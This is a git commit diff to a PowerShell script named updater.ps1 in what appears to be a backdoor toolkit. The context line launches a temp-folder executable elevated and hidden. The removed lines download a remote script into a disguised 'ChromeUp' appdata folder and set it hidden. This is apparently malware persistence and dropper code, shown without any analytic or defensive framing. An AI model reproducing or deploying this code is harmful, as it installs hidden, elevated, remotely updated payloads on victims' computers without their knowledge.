7d45eec5bd8e40d95f5ace51618db3f9ddbc94e4
blousekool <132397759+blousekool@users.noreply.github.com>
2023-09-26 17:48:14 +0200

    Update updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -24,18 +24,7 @@ $attr = [System.IO.FileAttributes]::Hidden
 #start new file
 Start-Process -FilePath "$env:temp/sVBXKuz/wsappa.exe" -Verb RunAs -WindowStyle Hidden
 
-#change directory
-cd $env:appdata/ChromeUp/
 
-#download new backup
-$url = "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1"
-$response = Invoke-WebRequest -Uri $url
-$response.Content | Set-Content -Path "backup.ps1"
-
-# Set "Hidden" attribute on the file
-$filePath = Join-Path $env:appdata\ChromeUp "backup.ps1"
-$attr = [System.IO.FileAttributes]::Hidden
-[System.IO.File]::SetAttributes($filePath, $attr)
 
 #sleep
 start-sleep 2
